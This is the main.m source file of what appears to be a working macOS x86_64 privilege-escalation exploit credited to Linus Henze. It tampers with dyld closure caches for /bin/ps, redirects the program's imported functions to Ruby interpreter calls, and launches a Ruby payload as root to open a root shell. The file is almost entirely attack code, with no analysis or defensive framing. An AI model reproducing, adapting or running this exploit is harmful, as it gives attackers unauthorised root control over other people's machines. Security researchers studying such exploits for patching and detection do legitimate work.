//
//  main.m
//  dyldExploitMacOS_x86_64
//
//  Created by Linus Henze.
//  Copyright Â© 2021 Linus Henze. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <stdio.h>
#import <stdlib.h>
#import <spawn.h>
#import <string.h>
#import <signal.h>
#import <unistd.h>
#import <sys/stat.h>
#import <ruby/ruby.h>
#import <mach-o/dyld_images.h>
#import <mach-o/dyld.h>
#import <sys/xattr.h>

#import "dyld_closure.h"
#import "ruby_payload.h"
#import "MachO.h"
#import "helper.h"

#define EXPLOIT_PATH "/private/tmp/pwn"

pid_t runRubyScriptInPS(char *payload) {
    char *fakeArgs[] = {
        "/bin/ps",
        NULL
    };
    
    // Launch ps - but as root now
    setenv("COLUMNS", payload, 1);
    pid_t pid = launchWithClosure(@"/bin/ps", @EXPLOIT_PATH, NO, fakeArgs);
    
    return pid;
}

int createPWNClosure() {
    char *fakeArgs[] = {
        "/bin/ps",
        "-h",
        NULL
    };
    
    puts("Creating real data...");
    
    // Now force a new closure
    pid_t pid = launchWithClosure(@"/bin/ps", @EXPLOIT_PATH, YES, fakeArgs);
    
    // Wait for ps to exit
    waitpid(pid, NULL, 0);
    
    // Find closure
    NSString *dyldPath = [NSString stringWithFormat: @"%@/Library/Containers/Data/Library/Caches/com.apple.dyld", @EXPLOIT_PATH];
    NSArray *dirContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath: dyldPath error: nil];
    NSString *closure = [NSString stringWithFormat: @"%@/%@", dyldPath, [dirContents firstObject]];
    
    puts("Reading real data...");
    
    // Read and modify closure
    FILE *f = fopen([closure UTF8String], "r");
    if (f == NULL) {
        puts("Failed to open closure for reading!");
        return -1;
    }
    
    fseek(f, 0, SEEK_END);
    size_t closureSize = ftell(f);
    size_t allocClosureSize = closureSize;
    fseek(f, 0, SEEK_SET);
    
    void *closureBuf = malloc(allocClosureSize);
    fread(closureBuf, 1, closureSize, f);
    fclose(f);
    
    puts("Modifying real data...");
    
    MachO *psMachO = [MachO createWithFile: @"/bin/ps"];
    
    printf("ruby_init @ %p\n", (void*) ruby_init);
    BOOL ok = closureReplaceBind(closureBuf, closureSize, [psMachO offsetOfGotEntry: @"_compat_mode"], (uint64_t) ruby_init);
    if (!ok) {
        puts("Failed to modify closure!");
        return -1;
    }
    
    printf("ruby_init_loadpath @ %p\n", (void*) ruby_init_loadpath);
    ok = closureReplaceBind(closureBuf, closureSize, [psMachO offsetOfGotEntry: @"_time"], (uint64_t) ruby_init_loadpath);
    if (!ok) {
        puts("Failed to modify closure!");
        return -1;
    }
    
    printf("rb_eval_string @ %p\n", (void*) rb_eval_string);
    ok = closureReplaceBind(closureBuf, closureSize, [psMachO offsetOfGotEntry: @"_atoi"], (uint64_t) rb_eval_string);
    if (!ok) {
        puts("Failed to modify closure!");
        return -1;
    }
    
    puts("Writing pwn data...");
    
    chmod([closure UTF8String], 0644);
    
    f = fopen([closure UTF8String], "w");
    if (f == NULL) {
        puts("Failed to open closure for writing!");
        return -1;
    }
    
    fwrite(closureBuf, 1, allocClosureSize, f);
    fclose(f);
    
    return 0;
}

int main(int argc, const char * argv[]) {
    int status = createPWNClosure();
    if (status != 0) {
        return status;
    }
    
    puts("Spawning r00t shell!");
    
    pid_t pid = runRubyScriptInPS(ruby_payload_root_shell);
    
    int exitVal = 0;
    waitpid(pid, &exitVal, 0);
    
    if (WIFEXITED(exitVal)) {
        return WEXITSTATUS(exitVal);
    } else if (WIFSIGNALED(exitVal)) {
        printf("OOPS: Child received signal %d\n", WTERMSIG(exitVal));
    }
    
    return -1;
}
